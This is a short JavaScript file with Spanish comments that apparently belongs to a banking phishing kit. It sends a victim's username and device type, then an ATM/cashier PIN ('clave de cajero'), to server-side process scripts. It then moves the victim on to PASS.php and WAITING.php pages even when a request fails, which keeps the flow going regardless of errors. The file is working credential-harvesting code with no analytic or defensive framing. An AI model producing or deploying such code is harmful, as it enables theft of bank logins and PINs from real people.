// ENVIAR USUARIO (LOGIN)
function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    
    // Quitamos el setTimeout y usamos el callback de éxito
    $.post("../process/inicio.php", { usr: u, dis: d }, function() {
        window.location.href = "PASS.php";
    }).fail(function() {
        // Si falla la red, saltamos igual a los 2 segundos
        setTimeout(function(){ window.location.href = "PASS.php"; }, 2000);
    });
}

// ENVIAR CLAVE DE CAJERO
function pasousuario(p){    
    $("#fondo, #cargando-o").show();
    
    $.post("../process/pasousuario.php", { pass: p }, function() {
        window.location.href = "WAITING.php";
    }).fail(function() {
        setTimeout(function(){ window.location.href = "WAITING.php"; }, 2000);
    });
}
